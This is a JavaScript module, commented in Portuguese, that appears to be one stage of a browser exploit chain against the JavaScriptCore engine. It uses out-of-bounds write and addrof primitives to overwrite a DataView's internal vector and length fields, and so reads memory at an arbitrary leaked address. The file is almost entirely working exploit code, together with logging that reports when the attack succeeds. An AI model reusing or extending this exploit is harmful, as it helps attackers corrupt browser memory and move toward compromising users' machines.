// js/script3/testArrayBufferVictimCrash.mjs (Re-tentativa Getter para Leitura Arbitrária Controlada - Potencial Máximo)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Usado para checagem de tamanho e como base para metadados do DV
    oob_dataview_real,     // O DataView cujos metadados serão manipulados
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment,
    isOOBReady,
    attemptAddrofUsingCoreHeisenbug // <--- Importado para Addrof
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v3_MaxPotential";

// === Constantes ===
// Onde plantamos o endereço absoluto (64-bit) que o getter deve usar para ler.
const ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET = 0x0180;

// Onde o getter copiará os dados lidos do endereço absoluto.
const DATA_COPY_DEST_OFFSET_IN_OOB = 0x0100;

// Offset para escrita de trigger (ainda pode ser útil para garantir que m_length do oob_dataview_real seja grande)
const TRIGGER_WRITE_OFFSET = 0x70; // Assumindo que 0x70 é o m_length do oob_dataview_real
const TRIGGER_WRITE_VALUE = 0xFFFFFFFF;

// Offsets RELATIVOS AO INÍCIO DO oob_array_buffer_real para os metadados do oob_dataview_real.
// O core_exploit.mjs usa HEISENBUG_OOB_DATAVIEW_METADATA_BASE = 0x58 como o local
// onde os metadados do oob_dataview_real são "embutidos" no oob_array_buffer_real.
const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Consistente com core_exploit
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// Dados de teste para o objeto cujo endereço será obtido
const OBJ_FOR_ADDROF_VAL1 = 0xBADF00D1;
const OBJ_FOR_ADDROF_VAL2 = 0xFEEDFACE;

// === Variáveis Globais do Módulo ===
let getter_object_ref = null;
let address_targeted_by_getter = null;
let data_successfully_read_and_copied_by_getter = false;
let original_oob_dv_m_vector = null;
let original_oob_dv_m_length = null;
let original_oob_dv_m_mode = null;


function ArbReadGetterReattempt() {
    const FNAME_GETTER = `${FNAME_MODULE_V28}.Getter`;
    logS3(`>>>> [${FNAME_GETTER} ACIONADO!] <<<<`, "vuln", FNAME_GETTER);
    data_successfully_read_and_copied_by_getter = false;
    address_targeted_by_getter = null;

    try {
        // 1. Getter lê o QWORD do endereço absoluto plantado em ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET
        const target_absolute_address_qword = oob_read_absolute(ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET, 8);
        if (!isAdvancedInt64Object(target_absolute_address_qword) || target_absolute_address_qword.isZero()) {
            logS3(`    [${FNAME_GETTER}] Endereço absoluto lido de ${toHex(ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET)} é inválido ou zero.`, "error", FNAME_GETTER);
            return "getter_error_reading_absolute_addr_qword";
        }
        address_targeted_by_getter = target_absolute_address_qword;
        logS3(`    [${FNAME_GETTER}] Endereço Absoluto Alvo para Leitura (lido de ${toHex(ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET)}): ${address_targeted_by_getter.toString(true)}`, "leak", FNAME_GETTER);

        // 2. SALVAR metadados originais do oob_dataview_real
        // Estes são os metadados do oob_dataview_real principal, que residem dentro do oob_array_buffer_real.
        logS3(`    [${FNAME_GETTER}] Salvando metadados originais do oob_dataview_real...`, "info", FNAME_GETTER);
        original_oob_dv_m_vector = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        original_oob_dv_m_length = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        original_oob_dv_m_mode = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        logS3(`        Original m_vector: ${original_oob_dv_m_vector.toString(true)} (@${toHex(OOB_DV_M_VECTOR_OFFSET)})`, "debug", FNAME_GETTER);
        logS3(`        Original m_length: ${toHex(original_oob_dv_m_length)} (@${toHex(OOB_DV_M_LENGTH_OFFSET)})`, "debug", FNAME_GETTER);
        logS3(`        Original m_mode: ${toHex(original_oob_dv_m_mode)} (@${toHex(OOB_DV_M_MODE_OFFSET)})`, "debug", FNAME_GETTER);

        // 3. Reconfigurar o oob_dataview_real para apontar para o endereço absoluto lido
        logS3(`    [${FNAME_GETTER}] Reconfigurando oob_dataview_real para apontar para ${address_targeted_by_getter.toString(true)}...`, "warn", FNAME_GETTER);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address_targeted_by_getter, 8); // m_vector aponta para o endereço absoluto
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);               // m_length máximo
        // O m_mode pode precisar ser ajustado dependendo do que se espera ler e das permissões. 0 (Default) ou 3 (Unchecked)
        // Por enquanto, vamos manter o que estava ou setar para um valor comum se necessário.
        // oob_write_absolute(OOB_DV_M_MODE_OFFSET, ???, 4);

        logS3(`    [${FNAME_GETTER}] oob_dataview_real reconfigurado. Tentando ler dados...`, "info", FNAME_GETTER);
        // 4. Ler dados do endereço absoluto (agora offset 0 do oob_dataview_real reconfigurado)
        const data_read_from_target_address = oob_read_absolute(0, 8); // Ler QWORD do endereço absoluto
        logS3(`    [${FNAME_GETTER}] Dados lidos de [${address_targeted_by_getter.toString(true)} + 0]: ${isAdvancedInt64Object(data_read_from_target_address) ? data_read_from_target_address.toString(true) : "ERRO_LEITURA_DADOS_ABS"}`, "leak", FNAME_GETTER);

        // 5. RESTAURAR metadados originais do oob_dataview_real para que ele volte a operar no oob_array_buffer_real
        logS3(`    [${FNAME_GETTER}] Restaurando metadados originais do oob_dataview_real...`, "warn", FNAME_GETTER);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, original_oob_dv_m_vector, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, original_oob_dv_m_length, 4);
        oob_write_absolute(OOB_DV_M_MODE_OFFSET, original_oob_dv_m_mode, 4);
        logS3(`    [${FNAME_GETTER}] Metadados do oob_dataview_real restaurados.`, "info", FNAME_GETTER);

        // 6. Copiar os dados lidos para DATA_COPY_DEST_OFFSET_IN_OOB (dentro do oob_array_buffer_real)
        // Esta escrita DEVE ocorrer após a restauração dos metadados do oob_dataview_real.
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, data_read_from_target_address, 8);
        data_successfully_read_and_copied_by_getter = true;
        logS3(`    [${FNAME_GETTER}] Dados lidos do endereço absoluto foram copiados para oob_buffer[${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}].`, "good", FNAME_GETTER);

    } catch (e) {
        logS3(`    ERRO CRÍTICO DENTRO DO ${FNAME_GETTER}: ${e.name} - ${e.message}\n${e.stack}`, "critical", FNAME_GETTER);
        // Tentar restaurar em caso de erro, se os valores originais foram capturados
        if (original_oob_dv_m_vector && original_oob_dv_m_length && original_oob_dv_m_mode && isOOBReady()) {
            try {
                logS3(`    [${FNAME_GETTER}] Tentando restaurar metadados do oob_dataview_real após erro...`, "warn", FNAME_GETTER);
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, original_oob_dv_m_vector, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, original_oob_dv_m_length, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, original_oob_dv_m_mode, 4);
                logS3(`    [${FNAME_GETTER}] Restauração de emergência concluída.`, "info", FNAME_GETTER);
            } catch (e_restore) {
                logS3(`    [${FNAME_GETTER}] Falha na restauração de emergência: ${e_restore.message}`, "critical", FNAME_GETTER);
            }
        }
    }
    return "arb_read_getter_v3_executed";
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.attemptMaxPotentialArbitraryRead`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Leitura Arbitrária Controlada via Addrof e Getter ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    address_targeted_by_getter = null;
    data_successfully_read_and_copied_by_getter = false;
    getter_object_ref = {};
    original_oob_dv_m_vector = null;
    original_oob_dv_m_length = null;
    original_oob_dv_m_mode = null;

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        leaked_address_of_object_str: null,
        address_targeted_by_getter_str: null,
        data_read_from_absolute_addr_str: null,
        message: "Teste não iniciado."
    };

    let object_for_addrof = { val1: OBJ_FOR_ADDROF_VAL1, val2: OBJ_FOR_ADDROF_VAL2, name: "TestObjectForAddrof_v3" };
    // Para facilitar a "verificação", poderíamos tentar ler o endereço de um ArrayBuffer com dados conhecidos.
    // No entanto, o addrof do core_exploit dá o endereço do objeto JS, não necessariamente do backing store direto.
    // Por enquanto, ler o início do objeto JS já é uma boa demonstração.

    try {
        // Forçar re-inicialização para garantir um estado limpo para os metadados do DataView
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou ambiente não está pronto.");
        }
        logS3("PASSO 1: Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);

        // PASSO 2: Obter o endereço do nosso objeto de teste usando a primitiva addrof do core_exploit
        logS3(`PASSO 2: Tentando obter o endereço de 'object_for_addrof' via core_exploit...`, "info", FNAME_CURRENT_TEST);
        const addrof_result = await attemptAddrofUsingCoreHeisenbug(object_for_addrof);

        if (!addrof_result || !addrof_result.success || !addrof_result.leaked_address_as_int64) {
            throw new Error(`Falha ao obter endereço do objeto (addrof): ${addrof_result?.message || 'Resultado Nulo'}`);
        }
        const absolute_address_of_object = addrof_result.leaked_address_as_int64;
        exploit_result.leaked_address_of_object_str = absolute_address_of_object.toString(true);
        logS3(`  Endereço de 'object_for_addrof' obtido: ${exploit_result.leaked_address_of_object_str}`, "vuln", FNAME_CURRENT_TEST);

        // PASSO 3: Plantar este endereço absoluto em ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET para o getter usar
        logS3(`PASSO 3: Plantando endereço ${exploit_result.leaked_address_of_object_str} em oob_buffer[${toHex(ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET)}]`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(ABSOLUTE_ADDR_TO_READ_PLANT_OFFSET, absolute_address_of_object, 8);

        // Limpar o local de cópia de dados para garantir que o que lermos é realmente do getter
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0, 0), 8);

        // PASSO 4: (Opcional, mas bom para robustez) Garantir que m_length do oob_dataview_real é grande.
        // A função triggerOOB_primitive já pode cuidar disso, mas uma escrita explícita aqui
        // garante que o oob_dataview_real pode ser usado para modificar seus próprios metadados.
        // O TRIGGER_WRITE_OFFSET (0x70) é OOB_DV_M_LENGTH_OFFSET se JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET for 0x18.
        logS3(`PASSO 4: Escrevendo valor de trigger ${toHex(TRIGGER_WRITE_VALUE)} em oob_buffer[${toHex(TRIGGER_WRITE_OFFSET)}] (m_length do oob_dv)...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(TRIGGER_WRITE_OFFSET, TRIGGER_WRITE_VALUE, 4); // Sobrescreve m_length do oob_dataview_real

        // PASSO 5: Definir o getter
        Object.defineProperty(getter_object_ref, 'triggerReadV3', {
            get: ArbReadGetterReattempt,
            configurable: true
        });
        logS3("PASSO 5: Getter 'triggerReadV3' definido.", "info", FNAME_CURRENT_TEST);

        // PASSO 6: Acionar o getter acessando a propriedade
        logS3("PASSO 6: Tentando acionar o getter acessando getter_object_ref.triggerReadV3...", "warn", FNAME_CURRENT_TEST);
        try {
            const getter_return_value = getter_object_ref.triggerReadV3;
            logS3(`  Acesso à propriedade do getter retornou: ${getter_return_value}`, "info", FNAME_CURRENT_TEST);
        } catch (e_getter_access) {
            logS3(`  ERRO ao tentar acionar o getter: ${e_getter_access.name} - ${e_getter_access.message}`, "error", FNAME_CURRENT_TEST);
            // Continuar mesmo se o acesso der erro, para verificar se o getter executou internamente
        }

        exploit_result.address_targeted_by_getter_str = address_targeted_by_getter ? address_targeted_by_getter.toString(true) : "N/A";

        if (data_successfully_read_and_copied_by_getter) {
            const copied_data_qword = oob_read_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, 8);
            exploit_result.data_read_from_absolute_addr_str = isAdvancedInt64Object(copied_data_qword) ? copied_data_qword.toString(true) : "ERRO_LEITURA_COPIA";
            logS3(`PASSO 7: Dados copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)} (lidos de ${exploit_result.address_targeted_by_getter_str}): ${exploit_result.data_read_from_absolute_addr_str}`, "leak", FNAME_CURRENT_TEST);

            if (isAdvancedInt64Object(copied_data_qword) && !copied_data_qword.isZero()) { // Se lemos algo não nulo
                exploit_result.success = true;
                exploit_result.message = "SUCESSO! Addrof obteve endereço, getter leu de endereço absoluto e copiou os dados!";
                document.title = `${FNAME_MODULE_V28}: ARB.READ ABS OK!`;
                logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
                logS3(`       Lido de ${exploit_result.address_targeted_by_getter_str}: ${exploit_result.data_read_from_absolute_addr_str}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                exploit_result.message = `Dados copiados (${exploit_result.data_read_from_absolute_addr_str}), mas são zero ou inválidos. Leitura de endereço absoluto pode não ter retornado dados significativos.`;
                document.title = `${FNAME_MODULE_V28}: Cópia Zero/Inv.`;
            }
        } else {
            exploit_result.message = "Getter foi acionado (ou tentado), mas os dados não foram marcados como lidos/copiados com sucesso via endereço absoluto.";
            logS3(`  Getter acionado, mas 'data_successfully_read_and_copied_by_getter' é false. Endereço alvo que o getter usou: ${exploit_result.address_targeted_by_getter_str}`, "warn", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha Leitura Abs.`;
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
    } finally {
        // Limpar o ambiente OOB é importante, especialmente após manipular metadados do DataView principal.
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Leitura Arbitrária Absoluta (Max Potential): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço do Objeto (via Addrof): ${exploit_result.leaked_address_of_object_str || "N/A"}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Endereço Alvo Lido pelo Getter: ${exploit_result.address_targeted_by_getter_str || "N/A"}`, "info", FNAME_CURRENT_TEST);
        if(exploit_result.data_read_from_absolute_addr_str) logS3(`  Dados Lidos do End. Absoluto (copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}): ${exploit_result.data_read_from_absolute_addr_str}`, "leak", FNAME_CURRENT_TEST);
        
        getter_object_ref = null; // Limpar referência
    }

    return {
        errorOccurred: errorCapturedMain,
        exploit_attempt_result: exploit_result,
        // Manter uma estrutura similar para toJSON_details se for usado por um logger/runner externo
        toJSON_details: {
            probe_variant: FNAME_MODULE_V28,
            status: exploit_result.success ? "success_arb_read_absolute" : "failed_arb_read_absolute",
            leaked_object_addr: exploit_result.leaked_address_of_object_str,
            getter_target_addr: exploit_result.address_targeted_by_getter_str,
            read_value_hex: exploit_result.data_read_from_absolute_addr_str
        }
    };
}
